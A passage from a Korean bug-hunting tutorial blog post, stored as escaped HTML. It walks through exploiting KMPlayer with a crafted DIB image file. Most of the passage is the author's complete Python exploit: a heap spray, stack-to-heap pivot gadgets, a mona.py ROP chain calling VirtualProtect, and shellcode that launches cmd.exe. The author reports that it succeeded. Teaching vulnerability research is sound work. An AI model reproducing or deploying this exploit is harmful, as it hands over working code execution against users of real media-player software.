&lt;p&gt;&amp;#xC81C;&amp;#xC77C; &amp;#xCC98;&amp;#xC74C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xB294; &amp;#xC704; &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &amp;#xADF8; &amp;#xB4A4;&amp;#xC5D0;&amp;#xB294; &amp;#xB610; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xB123;&amp;#xC5B4;&amp;#xC904; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; &amp;#xADF8;&amp;#xB0E5; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C;&amp;#xB9CC;&amp;#xC694;. &amp;#xC65C;&amp;#xB0D0;&amp;#xD558;&amp;#xBA74; &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;0x101cb056&lt;/code&gt; &amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0; &amp;#xB610; &amp;#xC774; &amp;#xC5B8;&amp;#xC800;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB420; &amp;#xB54C;&amp;#xB3C4; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xB77C;&amp;#xB294; &amp;#xBCF4;&amp;#xC7A5;&amp;#xC774; &amp;#xC5C6;&amp;#xC73C;&amp;#xB2C8;&amp;#xAE50;&amp;#xC694;. &amp;#xCD5C;&amp;#xC18C;&amp;#xD55C; &amp;#xD558;&amp;#xC704; 2 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB294; &amp;#xBC14;&amp;#xB00C;&amp;#xACA0;&amp;#xC8E0;. &amp;#xADF8;&amp;#xB807;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;esp&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC73C;&amp;#xB85C;, &amp;#xB2E4;&amp;#xC2DC; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4; &amp;#xB192;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xD799;&amp;#xC73C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F; &amp;#xB450; &amp;#xAC1C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774; &amp;#xD574;&amp;#xC904; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC73C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &amp;#xC544;&amp;#xB798; &amp;#xAC78;&amp;#xB85C; &amp;#xC4F0;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0095dffa&lt;/span&gt; : # ADD ESP,&lt;span class=&#34;hljs-number&#34;&gt;19010&lt;/span&gt; # POP EBP # POP EDI # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC911;&amp;#xAC04;&amp;#xC911;&amp;#xAC04;&amp;#xC5D0; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC744; &amp;#xC4F0;&amp;#xB2E4;&amp;#xAC00; &amp;#xBC14;&amp;#xAFBC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB4E4;&amp;#xC744; &amp;#xC2A4;&amp;#xD0B5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC544;&amp;#xB798; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x00433712&lt;/span&gt; : # POP EDX # POP EDI # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774;&amp;#xC81C; &amp;#xB192;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD588;&amp;#xC73C;&amp;#xBA74; &amp;#xADF8; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xB3C4; &lt;code&gt;ret&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD574;&amp;#xC8FC;&amp;#xBA74; &amp;#xC880; &amp;#xB354; &amp;#xC815;&amp;#xD655;&amp;#xB3C4;&amp;#xAC00; &amp;#xB192;&amp;#xC544;&amp;#xC9C0;&amp;#xACA0;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png&#34; alt=&#34;bughunting-tutorials-part4/Untitled.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC81C;&amp;#xAC00; &amp;#xC791;&amp;#xC131;&amp;#xD55C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; pack, unpack
&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; OrderedDict

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;create_rop_chain&lt;/span&gt;():&lt;/span&gt;
	&lt;span class=&#34;hljs-comment&#34;&gt;# rop chain generated with mona.py - www.corelan.be&lt;/span&gt;
	rop_gadgets = [
	&lt;span class=&#34;hljs-number&#34;&gt;0x00453c50&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00d6a848&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# ptr to &amp;amp;VirtualProtect() [IAT KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0094eb72&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x007d2499&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# XCHG EAX,ESI # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00652cb0&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EBP # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0042390c&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# &amp;amp; jmp esp [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x004c0267&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EBX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00000201&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# 0x00000201-&amp;gt; ebx&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0052d95d&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00000040&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# 0x00000040-&amp;gt; edx&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0082f8e0&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP ECX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00d0aafc&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# &amp;amp;Writable location [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x009fc414&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDI # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00426485&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# RETN (ROP NOP) [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0068c402&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EAX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x90909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# nop&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00744e56&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# PUSHAD # RETN [KMPlayer.exe]&lt;/span&gt;
	]
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;.join(pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;lt;I&amp;apos;&lt;/span&gt;, _) &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; rop_gadgets)

&lt;span class=&#34;hljs-comment&#34;&gt;#shellcode for runnig cmd.exe&lt;/span&gt;
shellcode = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x90&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&amp;quot;&lt;/span&gt;

p = &lt;span class=&#34;hljs-keyword&#34;&gt;lambda&lt;/span&gt; x : pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;L&amp;quot;&lt;/span&gt;, x)
up = &lt;span class=&#34;hljs-keyword&#34;&gt;lambda&lt;/span&gt; x : unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;L&amp;quot;&lt;/span&gt;, x)[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]

rop_chain = create_rop_chain()

BITMAPFILEHEADER = OrderedDict()
BITMAPINFOHEADER = OrderedDict()

BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSize&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x28\x1f\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x28&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biWidth&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;0x1c48&lt;/span&gt;)
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biHeight&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;0x1c48&lt;/span&gt;)
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biPlanes&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x01\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biBitCount&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x18\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biCompression&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x0a\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x00&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * (up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biWidth&amp;apos;&lt;/span&gt;]) *
up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biHeight&amp;apos;&lt;/span&gt;])))
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biXPelsPerMeter&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biYPelsPerMeter&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biClrUsed&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x02\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x00&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biClrImportant&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;

BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfType&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;BM&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfsize&amp;apos;&lt;/span&gt;] = p(up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;0x36&lt;/span&gt;)
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfReserved1&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfReserved2&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfOffBits&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x36\x00\x00\x00&amp;apos;&lt;/span&gt;

head = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Fandu_&amp;apos;&lt;/span&gt;
tail = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;FANDU_&amp;apos;&lt;/span&gt;
spray = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x11&amp;apos;&lt;/span&gt;
stack_to_heap = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00523702&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# PUSH ECX # POP ESP # POP ESI # POP EBX # RETN&lt;/span&gt;
heap_to_heap = p(&lt;span class=&#34;hljs-number&#34;&gt;0x0095ddef&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN&lt;/span&gt;
pivot = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00433712&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # POP EDI # POP ESI # POP EBX # RETN&lt;/span&gt;
ret = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00984e94&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# RETN&lt;/span&gt;
offset1 = &lt;span class=&#34;hljs-number&#34;&gt;0x11111111&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x101cb056&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x600000&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# for calculating size of 0x11 spray&lt;/span&gt;
offset2 = &lt;span class=&#34;hljs-number&#34;&gt;0x197c0d11&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x173772e1&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x100000&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# for skip some data which are mutated&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
payload += head +&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;aa&amp;apos;&lt;/span&gt;
payload += spray * offset1
payload += (heap_to_heap + stack_to_heap) * (&lt;span class=&#34;hljs-number&#34;&gt;0x400000&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)
payload += pivot * ((up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) - len(payload) - offset2 - &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; - len(tail)) / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)
payload += ret * (&lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)
payload += rop_chain
payload += shellcode
payload += spray * (up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) - len(payload)) &lt;span class=&#34;hljs-comment&#34;&gt;#dummy&lt;/span&gt;
payload += tail

exploit = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; BITMAPFILEHEADER.keys() :
	exploit += BITMAPFILEHEADER[key]

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; BITMAPINFOHEADER.keys() :
	exploit += BITMAPINFOHEADER[key]

exploit += payload

f = open(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./exploit.dib&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;wb&amp;apos;&lt;/span&gt;)
f.write(exploit)
f.close()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774; &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xC2DC;&amp;#xCF1C; &amp;#xB5A8;&amp;#xAD88;&amp;#xC9C4; &lt;code&gt;exploit.dib&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; KMPlayer&amp;#xC5D0; &amp;#xB123;&amp;#xC5B4; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;!!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png&#34; alt=&#34;bughunting-tutorials-part4/image--076.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB807;&amp;#xAC8C; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC9DD;&amp;#xC9DD;&amp;#xC9DD; &amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xADF8;&amp;#xC758;-&amp;#xACFC;&amp;#xAC70;&amp;#xC758;-&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xC7A1;&amp;#xB2F4;&#34;&gt;&lt;a href=&#34;#&amp;#xADF8;&amp;#xC758;-&amp;#xACFC;&amp;#xAC70;&amp;#xC758;-&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xC7A1;&amp;#xB2F4;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xADF8;&amp;#xC758; (&amp;#xACFC;&amp;#xAC70;&amp;#xC758;) &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xC7A1;&amp;#xB2F4;&#34;&gt;&lt;/a&gt;&amp;#xADF8;&amp;#xC758; (&amp;#xACFC;&amp;#xAC70;&amp;#xC758;) &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xC7A1;&amp;#xB2F4;&lt;/h1&gt;&lt;p&gt;&amp;#xC73C;&amp;#xC73C; &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#xB05D;&amp;#xB0AC;&amp;#xB124;&amp;#xC694; &amp;#x314B;&amp;#x314B; &amp;#xC6D0;&amp;#xB798; 12 &amp;#xC6D4; &amp;#xC911;&amp;#xC21C;&amp;#xC778;&amp;#xAC00; &amp;#xB9D0;&amp;#xC778;&amp;#xAC00; &amp;#xC2DC;&amp;#xC791;&amp;#xD588;&amp;#xB294; &amp;#xB370; 1 &amp;#xC6D4;&amp;#xC5D0; &amp;#xBA58;&amp;#xD0C8;&amp;#xC774; &amp;#xB098;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xB05D;&amp;#xB0AC;&amp;#xB124;&amp;#xC694; &amp;#xD6C4;&amp;#xC6B0;&amp;#x2026; &amp;#xC5ED;&amp;#xC2DC; &amp;#xB098; &amp;#xC0C8;&amp;#xB07C;&amp;#xB294; &amp;#xAC8C;&amp;#xC73C;&amp;#xB978; &amp;#xB188;&amp;#x2026;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xB798; &amp;#xC774; &amp;#xAE00;&amp;#xC744; &amp;#xC4F4; &amp;#xC774;&amp;#xC720;&amp;#xAC00; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4; &amp;#xAD50;&amp;#xC721;&amp;#xC2DC;&amp;#xD0A4;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xAC83;&amp;#xB3C4; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC0AC;&amp;#xC2E4; &amp;#xC804;&amp;#xC5D0; cdpython &amp;#xD615;&amp;#xC774; &amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xAE00; &amp;#xC4F0;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC70; &amp;#xAC19;&amp;#xB2E4;&amp;#xACE0; &amp;#xD574;&amp;#xC11C; &amp;#xC4F0;&amp;#xAC8C; &amp;#xB410;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B; &amp;#xB9CE;&amp;#xC740; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; 